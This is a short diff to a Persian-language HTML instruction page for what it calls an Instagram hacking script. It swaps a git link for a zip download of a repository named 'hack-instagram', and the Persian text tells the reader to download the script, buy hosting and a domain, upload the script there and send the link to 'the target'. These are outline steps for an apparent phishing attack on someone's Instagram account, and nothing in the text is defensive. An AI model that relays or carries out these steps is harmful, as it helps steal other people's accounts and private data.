@@ -6,9 +6,7 @@ _______________________________________
 <h2>ابتدا اسکریپت زیر را از طریق لینک دانلود کنید</h2>
 <br><br><br><br>
   
-  
-  
-https://github.com/pezhmanmehri/hack-instagram.git
+  https://github.com/pezhmanmehri/hack-instagram/archive/refs/heads/main.zip
 <br><br>
 و یک هاست و دامنه تهیه کنید و فایل اسکریپت رو در اون آپلود کنید و لینک رو به تارگت بدید ، 
 <br>
